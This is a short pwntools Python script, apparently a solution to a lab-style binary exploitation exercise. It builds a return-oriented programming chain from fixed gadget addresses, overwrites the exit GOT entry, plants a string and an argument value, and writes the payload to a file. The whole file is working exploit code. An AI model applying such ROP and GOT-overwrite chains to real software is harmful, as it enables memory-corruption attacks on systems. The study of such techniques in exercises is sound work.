from pwn import *
#1穿2
def set_rdi(rdi):
	return p64(pop_rax)+p64(rdi)+p64(mov_rdi_rax)

def set_mem(mem,value):
	return p64(pop_rax)+p64(mem-0x48)+p64(xchg_ecx_eax)+p64(pop_rax)+p64(value)+p64(xchg_eax_crcx_48)

mov_rdi_rax=0x4019C5
pop_rax=0x4019CC
xchg_eax_crcx_48=0x401A04
mov_ecx_edx=0x401A34
xchg_ecx_eax=0x401A3A
ret=0x401A3E
exit_got=0x6050E8

exp=p64(0)*5+set_mem(exit_got,pop_rax)+set_rdi(0x59b997fa)+p64(0x4017F0)+set_mem(0x605960,0x39623935)+set_mem(0x605964,0x61663739)+set_rdi(0x605960)+set_mem(exit_got,0x400E46)+p64(0x4018FB)
rexp_f=open("rexp","w")
rexp_f.write(exp)
rexp_f.close()
